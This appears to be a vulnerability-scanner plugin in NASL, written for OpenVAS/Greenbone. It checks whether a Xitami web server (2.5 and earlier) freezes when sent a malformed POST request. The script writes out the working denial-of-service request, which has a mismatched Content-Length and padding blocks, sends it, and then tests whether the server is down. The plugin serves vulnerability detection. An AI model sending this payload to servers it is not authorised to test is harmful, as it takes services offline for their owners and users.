# SPDX-FileCopyrightText: 2003 Michel Arboi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11934");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/9083");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_name("Xitami Malformed Header DoS Vulnerability");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_analysis");

  script_copyright("Copyright (C) 2003 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("secpod_xitami_server_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("xitami/http/detected");

  script_tag(name:"solution", value:"Upgrade your software or use another.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"It is possible to freeze the remote web server by
  sending a malformed POST request.");

  script_tag(name:"affected", value:"Xitami version 2.5 and prior is known to be affected.");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:80);

if(http_is_dead(port:port))
  exit(0);

host = http_host_name(port:port);

soc = http_open_socket(port);
if(!soc)
  exit(0);

req = string("POST /forum/index.php HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "Accept-Encoding: None\r\n",
             "Content-Length: 10\n\n",
             crap(512), "\r\n",
             crap(512));

send(socket:soc, data:req);
http_recv(socket:soc);
http_close_socket(soc);

if(http_is_dead(port:port))
  security_message(port:port);
